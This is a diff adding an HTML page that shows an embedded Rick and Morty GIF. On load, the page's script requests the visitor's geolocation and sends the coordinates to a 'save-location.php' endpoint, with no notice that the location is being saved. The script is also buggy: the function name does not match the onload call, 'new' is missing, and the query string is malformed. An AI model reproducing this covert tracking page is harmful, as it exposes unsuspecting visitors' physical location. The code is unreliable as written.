@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<body onload="getlocation()" >
+
+    <div style="width:100%;height:0;padding-bottom:56%;position:relative;"><iframe src="https://giphy.com/embed/Qvpxb0bju1rEp9Nipy" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/rickandmorty-season-1-adult-swim-rick-and-morty-Qvpxb0bju1rEp9Nipy">via GIPHY</a></p>
+  
+
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    const xhttp =XMLHttpRequest();
+    xhttp.open("GET", "save-location.php?lat=" +position.coords.latitude+ "long"+position.coords.longitude,);
+xhttp.send();
+}
+</script>
+
+</body>
+</html>
+
